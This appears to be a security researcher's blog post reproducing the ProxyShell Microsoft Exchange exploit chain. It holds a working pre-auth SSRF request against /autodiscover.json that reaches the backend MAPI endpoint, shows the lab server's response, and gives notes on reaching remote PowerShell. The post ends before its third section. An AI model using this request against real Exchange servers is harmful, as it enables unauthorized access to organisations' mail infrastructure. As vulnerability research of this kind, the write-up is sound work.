---
layout: post
title:  "My journey to reproduce the Proxyshell exploit chain (reported by Orange Tsai)"
date:   2021-08-16 16:00:00 +0700
categories: researches
description: Haha
---

## ProxyShell Microsoft Exchange 

Reference: 
- The original talk from Orange Tsai: https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf?fbclid=IwAR2V0-4k2yb8dmPP5Mksd8iHYTOfE6sBwygMt4wjq3M9be8Tw6TlH0andhA
- Amazing research write up from @peterjson and Jang: https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1
- https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/


### 1. Pre-auth SSRF

The endpoint `/autodiscover.json` is one of the endpoints that we can access without authentication

<img width="1413" alt="image" src="https://user-images.githubusercontent.com/37280106/129542517-f35ab234-4613-491c-844a-75e88fbf8da8.png">

If our URL end with `/autodiscover.json` , `ClientRequest` will fetch the param `Email` 

<img width="1262" alt="image" src="https://user-images.githubusercontent.com/37280106/129544327-4c4fe18e-eb19-4466-a616-aff25e3a4087.png">

`explicitLogonAddress` must contains valid email address

So if our `explicitLogonAddress=/autodiscover/autodiscover.json?a=a@test.com` then the `/autodiscover/autodiscover.json?a=a@test.com` part will be removed from the URI

When preparing request to send to backend internal, Exchange will generate Kerberos auth header and attach into Authorization header. This is why we can reach some other endpoint without any authentication


The Fatal erase: 

```text
GET /autodiscover/autodiscover.json?@test.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/2
Host: exchange.local
Cookie: cookieTest=1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Te: trailers
```

```text
HTTP/2 200 OK
Cache-Control: private
Content-Type: text/html
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
Request-Id: 505bae40-9e29-4c22-9bb6-68686012d721
X-Calculatedbetarget: win-mkl80dild4h.exchange.local
X-Serverapplication: Exchange/15.01.2176.009
X-Diaginfo: WIN-MKL80DILD4H
X-Beserver: WIN-MKL80DILD4H
X-Aspnet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=; expires=Thu, 15-Aug-1991 03:08:59 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-Feserver: WIN-MKL80DILD4H
Date: Sun, 15 Aug 2021 03:08:58 GMT
Content-Length: 553

<html>
<head>
<title>Exchange MAPI/HTTP Connectivity Endpoint</title>
</head>
<body>
<p>Exchange MAPI/HTTP Connectivity Endpoint<br><br>Version: 15.1.2176.9<br>Vdir Path: /mapi/nspi/<br><br></p><p>
```

<img width="1146" alt="image" src="https://user-images.githubusercontent.com/37280106/129546779-695fca9d-dd4c-47d2-a498-5feb214f5df5.png">

We archieved the Pre-auth SSRF, direct access to Exchange Server back-end !!!


### 2. Exchange Powershell Remoting

We need to look for the way to access `/powershell` endpoint
From Orange Tsai talks, he said that because we access the endpoint with `NT\SYSTEM` priviledge, we will fail the business logic since `SYSTEM` does not have any mailbox.

We cannot forge the `X-CommonAccessToken` because it's in the blacklisted cookies/headers


A few module we should pay attention to

```text
Microsoft.Exchange.Security
Microsoft.Exchange.PwshClient
Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule
```

This module is called before the `BackendRehydrationModule`



> Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule

<img width="698" alt="image" src="https://user-images.githubusercontent.com/37280106/129539952-0a312293-c8b9-41c7-89b4-9146591c3722.png">


> Microsoft.Exchange.Security.Authorization.CommonAccessToken ( Serialization)

<img width="1041" alt="image" src="https://user-images.githubusercontent.com/37280106/129540035-3ab2be12-3540-45dd-85a4-bdb7aeb89581.png">



> Microsoft.Exchange.Security.Authorization.CommonAccessToken (deserialization)

<img width="1073" alt="image" src="https://user-images.githubusercontent.com/37280106/129540057-3b6def40-f842-4283-aca9-13c20ef48842.png">



### 3. Working with remote Powershell
...
